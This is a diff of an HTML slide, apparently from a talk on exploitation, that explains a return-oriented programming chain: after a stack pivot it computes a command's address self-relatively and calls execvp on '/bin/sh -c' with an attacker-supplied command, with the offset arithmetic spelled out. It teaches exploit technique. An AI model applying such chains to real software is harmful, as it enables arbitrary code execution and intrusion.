@@ -1,31 +1,42 @@
-<section>
-  <h2 class="section-title">Self-relative addressing &rarr; <code>execvp</code></h2>
+<section class="dense">
+  <h2 class="section-title">The ROP chain &mdash; computing <code>&amp;cmd</code> with no known address</h2>
   <div class="two-col">
     <div class="col">
       <div class="card card-red">
-        <div class="card-header">the chain (after the pivot, RSP = blob+32)</div>
-        <pre><code class="language-text">push rsp ; pop rcx ; ret      ; rcx = &amp;blob[40]
-pop rax ; ret                 ; rax = CMD_OFFSET - 0x34
-add rax, rcx ; add rax,0x12   ; rax = &amp;command   (self-relative)
-  ; ... pop rbp ; ret
-pop rdi ; ret                 ; rdi = &amp;spray.argv[2]
-mov [rdi], rax ; ... ; ret    ; argv[2] = &amp;command
-pop rdi ; ret                 ; rdi = "/bin/sh"
-pop rsi ; ret                 ; rsi = &amp;spray.argv
-call execvp@plt               ; execvp("/bin/sh",
-                              ;   {"/bin/sh","-c",&amp;cmd,NULL})</code></pre>
+        <div class="card-header">after the pivot, RSP walks down the chain (inside the blob)</div>
+        <pre><code class="language-text">goal: execvp("/bin/sh", { "/bin/sh","-c",&cmd,NULL })
+      need:  rdi = "/bin/sh"    rsi = &argv
+──────────────────────────────────────────────
+1  push rsp ; pop rcx     rcx = RSP = blob + R
+2  pop rax ; add rax,rcx   rax = &cmd
+   ... ; add rax,0x12      (see the math →)
+3  pop rdi ; mov [rdi],rax argv[2] = &cmd   (the 1 gap)
+4  pop rdi                rdi = "/bin/sh"   (spray)
+5  pop rsi                rsi = &argv       (spray)
+6  call execvp@plt        → /bin/sh -c "cmd"</code></pre>
       </div>
     </div>
     <div class="col">
-      <div class="textbox">
-        <p><span class="inline-tag tag-purple">Self-relative</span> <code>push rsp; pop rcx</code> recovers the runtime stack pointer, so <code>&amp;command</code> is computed on the fly &mdash; the command can live in the blob, with no pre-known address.</p>
-      </div>
-      <div class="textbox" style="margin-top: 12px;">
-        <p><span class="inline-tag tag-purple">Run-time <code>argv[2]</code></span> The three other <code>argv</code> cells are baked into the spray; only the command pointer is patched in via <code>mov [rdi], rax</code>.</p>
-      </div>
-      <div class="textbox" style="margin-top: 12px;">
-        <p><span class="inline-tag tag-cyan">Free literal</span> <code>argv[1] = "-c\0"</code> is taken straight from the engine&apos;s <code>.rodata</code> &mdash; one fewer spray dependency.</p>
+      <div class="card card-blue">
+        <div class="card-header">the self-relative math &mdash; all offsets inside a blob WE built</div>
+        <pre><code class="language-text">known (we chose the layout):
+   command  at   blob + 160
+   RSP lands at   blob + R     (a fixed spot)
+
+   rcx = RSP = blob + R         ; push rsp ; pop rcx
+   want:  &cmd = rcx + (160 − R)
+
+gadgets only do:  rax = c ; rax += rcx ; rax += 0x12
+so bake  c = 160 − R − 0x12  into the blob:
+   rax = c              = 160 − R − 0x12
+   rax += rcx (blob+R)  = blob + 160 − 0x12
+   rax += 0x12          = blob + 160 = &cmd   ✓
+
+160, R, 0x12 are constants WE picked. Only the base
+(blob) is unknown — but rcx carries it, so it cancels:
+we never have to predict it.</code></pre>
       </div>
     </div>
   </div>
+  <p class="slide-note">Everything but <code>&amp;cmd</code> is pre-staged: <code>"/bin/sh"</code>, the <code>argv</code> array, <code>NULL</code> &rarr; <span class="inline-tag tag-blue">spray</span>; <code>"-c"</code> &rarr; <span class="inline-tag tag-green">.rodata</span>. Only <code>&amp;cmd</code> sits in the moving blob &mdash; hence the math.</p>
 </section>
